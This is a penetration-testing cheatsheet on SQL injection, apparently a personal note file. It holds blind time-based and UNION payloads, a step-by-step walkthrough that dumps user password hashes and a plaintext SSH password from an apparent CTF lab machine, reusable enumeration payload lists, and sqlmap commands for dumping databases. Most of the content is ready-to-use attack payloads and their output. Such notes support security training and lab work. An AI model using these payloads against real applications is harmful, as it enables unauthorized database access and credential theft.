---
title: SQL Injection
categories: [Cheatsheet, Web]
tags: [cheatsheet/web, exploit/sqli/database-enum ]
img_path: /Cheatsheet/Web/SQLi/images
---

# Example

## Example of Blind & Classic
- Blind (Time-Based)
	```
	Encoded:
	username=test%27+AND+%28SELECT+8156+FROM+%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT+IFNULL%28CAST%28username+AS+NCHAR%29%2C0x20%29+FROM+Webapp.Users+ORDER+BY+id+LIMIT+4%2C1%29%2C6%2C1%29%29%3E1%2C0%2C1%29%29%29%29%29RKIU%29+AND+%27FTfR%27%3D%27FTfR&password=test&submit=+Login+

	Decoded:
	username=test' AND (SELECT 8156 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT IFNULL(CAST(username AS NCHAR),0x20) FROM Webapp.Users ORDER BY id LIMIT 4,1),6,1))>1,0,1)))))RKIU) AND 'FTfR'='FTfR&password=test&submit= Login 
	```
- Classic
	```
	Encoded:
	anon%27%20UNION%20ALL%20SELECT%20CONCAT%280x716a627a71%2CJSON_ARRAYAGG%28CONCAT_WS%280x646b736c6d76%2Cbookname%2Cid%2Cprice%29%29%2C0x716a627171%29%2CNULL%2CNULL%20FROM%20webapphacking.books--%20-
	
	Decoded:
	anon' UNION ALL SELECT CONCAT(0x716a627a71,JSON_ARRAYAGG(CONCAT_WS(0x646b736c6d76,bookname,id,price)),0x716a627171),NULL,NULL FROM webapphacking.books-- -
	```

## Database Enumeration GET
- POST Examples
	-  [[HackMe]],
	-   [[Game Zone]]
	-   [[DC9#SQLi w o SQLMap - Staff Database|DC9]]

1. Query
	![[theMarketplace query.png]]
2. Determine if query is susceptible to SQLi
	![[theMarketplace SQLi susceptible.png]] 	
3. Hypothesis 1
	```
	# SQL Query
	SELECT * FROM USERS WHERE user_id = '$_GET['user_input']'
	# Payload: Syntax Error
	SELECT * FROM USERS WHERE user_id = '''
	```
4. Determine the number of columns this table has
	```
	# SQLi Payload 
	GET /admin?user=1+ORDER+BY+1
	GET /admin?user=1+ORDER+BY+2
	GET /admin?user=1+ORDER+BY+3
	GET /admin?user=1+ORDER+BY+4
	GET /admin?user=1+ORDER+BY+5 [ERROR!]
	
	# Payload
	user=1 ORDER BY 1
	```
	![[theMarketplace found no. of columns.png]]
5. Hypothesis 2
	```
	# Failed at ORDER BY 5 Because only querying 4 columns
	SELECT username, user_id, isAdministrator, unknown_column WHERE user_id = '$_GET['user_input']'
	```
	- No. of Columns: 4
6. Determine which columns are reflected
	```
	# SQLi Payload 
	GET /admin?user=-1+UNION+SELECT+1,2,3,4
	
	# Payload
	user=-1 UNION SELECT 1,2,3,4
	```
	![[theMarketplace found which columns reflected.png]]
	- Reflected Columns: 1,2
7. Determine current database
	```
	# SQLi Payload 
	GET /admin?user=-1+UNION+SELECT+database(),database(),3,4 
	
	# Payload
	user=-1 UNION SELECT database(),database(),3,4
	```
	![[theMarketplace sqli found database name.png]]
	- Database Name: marketplace
8. If you want to determine all the databases
	```
	GET /admin?user=-1+UNION+SELECT+group_concat(SCHEMA_NAME),2,3,4+FROM+information_schema.schemata
	
	# Payload
	UNION SELECT group_concat(SCHEMA_NAME),2,3,4 FROM information_schema.schemata
	```
1. Determine tables in the database(marketplace)
	```
	# SQLi Payload 
	GET /admin?user=-1+UNION+SELECT+1,group_concat(table_name),3,4+FROM+information_schema.tables+WHERE+table_schema='marketplace'
	
	# Payload
	user=0 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='marketplace'
	
	## group_concat is used to append all the tables into one column to be displayed
	
	```
	![[theMarketplace sqli found tables.png]]
	- Tables in marketplace database:
		- items
		- messages
		- users
9. Determine columns in `users` table
	```
	# SQLi Payload
	GET /admin?user=-1+UNION+SELECT+1,group_concat(column_name),3,4+FROM+information_schema.columns+WHERE+table_name='users' 
	
	# Payload
	user=0 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='users'
	```
	![[theMarketplace sqli found columns in user table.png]]
	- Table: `Users`
		- isAdministrator: 1 or 0
		- password: hash
		- username: string
10. Determine value of columns in `users` table
	```
	# SQLi Payload
	GET /admin?user=-1+UNION+SELECT+1,group_concat(username,':',password),3,4+FROM+users
	
	# Payload
	0 union select 1,group_concat(id,':',username,':',password,':',isAdministrator,'\n'),3,4 from marketplace.users-- -
	```
	![[theMarketplace sqli found value of columns in table users.png]]
	- Table: `users`
		- Column: username+password
		```
		system:$2b$10$83pRYaR/d4ZWJVEex.lxu.Xs1a/TNDBWIUmB4z.R0DT0MSGIGzsgW,
		michael:$2b$10$yaYKN53QQ6ZvPzHGAlmqiOwGt8DXLAO5u2844yUlvu2EXwQDGf/1q,
		jake:$2b$10$/DkSlJB4L85SCNhS.IxcfeNpEBn.VkyLvQ2Tk9p2SDsiVcCRb4ukG,
		test:$2b$10$YXvIyq0R18BubtZWNAJ.m.HsAeZoke9Sbwk1sxryYPl0qwYTM.ZgG 
		```
11. Determine value of columns in `messages` table
	```
	# SQLi Payload
	GET /admin?user=-1+UNION+SELECT+1,group_concat(column_name),3,4+FROM+information_schema.columns+WHERE+table_name='messages'
	
	# Payload
	user=0 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='messages'
	```
	![[theMarketplace sqli found columns in messages table.png]]
	- Table: `messages`
		- is_read: 1 or 0
		- message_content: String
		- user_from: integer
		- user_to: integer
12. Determine values in columns of `messages` table
	```
	# SQLi Payload
	GET /admin?user=-1+UNION+SELECT+1,group_concat(user_to,':',message_content),3,4+FROM+messages
	
	# Payload
	-1 UNION+SELECT 1,group_concat(user_to,':',message_content),3,4 FROM messages
	
	# Use group_concat to append all message_content from all users into one single column value for display
	
	```
	![[theMarketplace sqli found value in columns in table messages.png]]
	- Table `messages`
		- Column: user_to+message_content
			```
			User 3:Hello!
			An automated system has detected your SSH password is too weak and needs to be changed. You have been generated a new temporary password.
			Your new password is: @b_ENXkGYUCAv3zJ,

			4:Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace!,
			4:Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace!,
			4:Thank you for your report. We have reviewed the listing and found nothing that violates our rules.,
			4:Thank you for your report. We have reviewed the listing and found nothing that violates our rules.,
			4:Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace!,
			4:Thank you for your report. We have reviewed 
			```
	- User 3: Jake
		- jake:@b_ENXkGYUCAv3zJ

# Payload

## Enumerate NUMBER of columns
- ORDER BY
	```
	# Observer the http response size
	wfuzz -c -z range,1-10 "http://meh.com/index.php?id=1 order by FUZZ"
	```
	```
	id=1 ORDER BY 1
	id=1 ORDER BY 2
	id=1 ORDER BY 3
	id= ORDER BY 1,2,3,4,5,6
	```
- UNION
	```
	id=-1' UNION SELECT 1 -- -
	id=-1' UNION SELECT 1,2 -- -
	id=-1' UNION SELECT 1,2,3 -- -

	id=1' UNION SELECT 1 #
	id=1' UNION SELECT 1,2 #
	id=1' UNION SELECT 1,2,3 #

	id=1' UNION SELECT 1 -- -
	id=1' UNION SELECT 1,2 -- -
	id=1' UNION SELECT 1,2,3 -- -
	
	id=1 UNION SELECT 1 -- -
	```
- UNION ALL
	```
	id=1' UNION ALL SELECT 1 #
	id=1' UNION ALL SELECT 1,2 #
	id=1' UNION ALL SELECT 1,2,3 #
	
	id=1' UNION ALL SELECT 1 -- -
	id=1' UNION ALL SELECT 1,2 -- -
	id=1' UNION ALL SELECT 1,2,3 -- -

	id=-1' UNION ALL SELECT 1 -- -
	id=-1' UNION ALL SELECT 1,2 -- -
	id=-1' UNION ALL SELECT 1,2,3 -- -
	```

## Enumerate REFLECTED columns
- UNION
	```
	id=-1' UNION SELECT 1 -- -
	id=-1' UNION SELECT 1,2 -- -
	id=-1' UNION SELECT 1,2,3 -- -

	id=1' UNION SELECT 1 #
	id=1' UNION SELECT 1,2 #
	id=1' UNION SELECT 1,2,3 #

	id=1' UNION SELECT 1 -- -
	id=1' UNION SELECT 1,2 -- -
	id=1' UNION SELECT 1,2,3 -- -
	```
- UNION ALL
	```
	id=1' UNION ALL SELECT 1 #
	id=1' UNION ALL SELECT 1,2 #
	id=1' UNION ALL SELECT 1,2,3 #
	
	id=1' UNION ALL SELECT 1 -- -
	id=1' UNION ALL SELECT 1,2 -- -
	id=1' UNION ALL SELECT 1,2,3 -- -

	id=-1' UNION ALL SELECT 1 -- -
	id=-1' UNION ALL SELECT 1,2 -- -
	id=-1' UNION ALL SELECT 1,2,3 -- -
	```


## Enumarete ALL databases
- POST
	```
	' UNION SELECT 1,2,3,4,5,group_concat(SCHEMA_NAME) FROM information_schema.schemata #
	```
- GET
	```
	-1+UNION+SELECT+group_concat(SCHEMA_NAME),2,3,4+FROM+information_schema.schemata#
	```

## Enumerate CURRENT database
- POST
	```
	' UNION SELECT 1,2,3,4,5,database()#
	```
- GET
	```
	-1+UNION+SELECT+database(),2,3,4#
	```
	
## Enumerate TABLES in chosen database
- POST
	```
	' UNION ALL SELECT 1,2,3,4,5,group_concat(table_name) from information_schema.tables WHERE table_schema='Staff'#
	```
- GET
	```
	-1+UNION+SELECT+1,group_concat(table_name),3,4+FROM+information_schema.tables+WHERE+table_schema='marketplace'#
	```
	

## Enumerate COLUMNS in chosen table
- POST
	```
	' UNION ALL SELECT 1,2,3,4,5,group_concat(column_name) from information_schema.columns WHERE table_name='Users'#
	```
- GET
	```
	-1+UNION+SELECT+1,group_concat(column_name),3,4+FROM+information_schema.columns+WHERE+table_name='users'#
	```
	
## Enumerate COLUMNS in chosen table (FOR DOCUMENTATION)
- POST
	```
	' UNION ALL SELECT 1,2,3,4,5,group_concat(table_name,':',column_name) from information_schema.columns WHERE table_name='Users'#
	```
- GET
	```
	-1+UNION+SELECT+1,group_concat(table_name,':',column_name),3,4+FROM+information_schema.columns+WHERE+table_name='users'#
	```
	
	
	
## Determine VALUE of columns in chosen table
- POST
	```
	' UNION ALL SELECT 1,2,3,4,5,group_concat(UserID, ':', Username, ':', Password) FROM Staff.Users#
	```
- GET
	```
	-1+UNION+SELECT+1,group_concat(username,':',password),3,4+FROM+marketplace.users#
	```
	


## Enumerate ALL tables
- Usually not useful, too many output
- POST
	```
	UNION SELECT group_concat(TABLE_NAME),2,3,4 FROM information_schema.tables#
	```
- GET
	```
	-1+UNION+SELECT+group_concat(TABLE_NAME),2,3,4+FROM+information_schema.tables#
	```


## Documentation
```
# var=''
# echo -n $var | sed 's/,/\n/g'
available databases [2]:
[*] Staff
[*] users

Database: Staff
[2 Tables]
StaffDetails
Users

Database: Staff
Table: Users
[3 Columns]
Password
UserID
Username

# Dump column entries
Database: Staff
Table: Users
[Columns: Username:Password]
admin:856f5de590ef37314e7c3bdf6f8a66dc


Database: users
[1 Table]
UserDetails

Database: users
Table: UserDetails
[6 Columns]
id
firstname
lastname
username
password
reg_date


# Dump column entries
Database: users
Table: UserDetails
[Columns: username:password]
marym:3kfs86sfd
```

# SQLMAP 
1. Dump databases
	```
	sqlmap -r sqli.txt -p <parameter> --dbs --output-dir=$(pwd)/sqlmap
	```
2. Dump tables
	```
	sqlmap -r sqli.txt -p <parameter> -D <dbs> --tables --output-dir=$(pwd)/sqlmap
	```
3. Dump columns
	```
	sqlmap -r sqli.txt -p <parameter> -D <dbs> -T <table> --columns --dump --output-dir=$(pwd)/sqlmap
	```
4. Dump specific columns
	```
	sqlmap -r sqli.txt -p <parameter> -D <dbs> -T <table> -C <column1,column2> --dump --output-dir=$(pwd)/sqlmap
	```
5. Try levels
	```
	--level=5 --risk=3
	```
6. Proxy
	```
	 --proxy=http://192.168.110.27:31337/
	```
7. Specify URL instead 
	```
	# Remember to specify form if its a login page
	# Or you can just point it directly to the login.php, --form will not be needed
	
	# w/ --form
	sqlmap --url http://pinkys-palace:8080/littlesecrets-main/ --dbs --output-dir=$(pwd)/sqlmap --form
	
	# w/o --form
	sqlmap --url http://pinkys-palace:8080/littlesecrets-main/login.php --dbs --output-dir=$(pwd)/sqlmap
	```
- Options

	```
	sqlmap -r sqli.txt --dump --output-dir=$(pwd)/sqlmap 

		-p TESTPARAMETER    Testable parameter(s)
		-v VERBOSE          Verbosity level: 0-6 (default 1)
		--dbs               Enumerate DBMS databases
		--tables            Enumerate DBMS database tables
		--columns           Enumerate DBMS database table columns
		--schema            Enumerate DBMS schema
		--count             Retrieve number of entries for table(s)
		--dump              Dump DBMS database table entries
		--dump-all          Dump all DBMS databases tables entries


		-D DB               DBMS database to enumerate
		-T TBL              DBMS database table(s) to enumerate
		-C COL              DBMS database table column(s) to enumerate
		-X EXCLUDE          DBMS database identifier(s) to not enumerate
		-U USER             DBMS user to enumerate
	```

- Specify Headers

	```
	./sqlmap.py --headers="User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:25.0) Gecko/20100101 Firefox/25.0" --cookie="security=low; PHPSESSID=oikbs8qcic2omf5gnd09kihsm7" -u 'http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1-BR&Submit=Submit#' --level=5 risk=3 -p id
	```

## Some Good Reference
- https://pentest.tonyng.net/sql-injection-cheat-sheet/
- https://www.youtube.com/watch?v=_Aa8125CQ0g
- https://medium.com/@drag0n/sqlmap-tamper-scripts-sql-injection-and-waf-bypass-c5a3f5764cb3





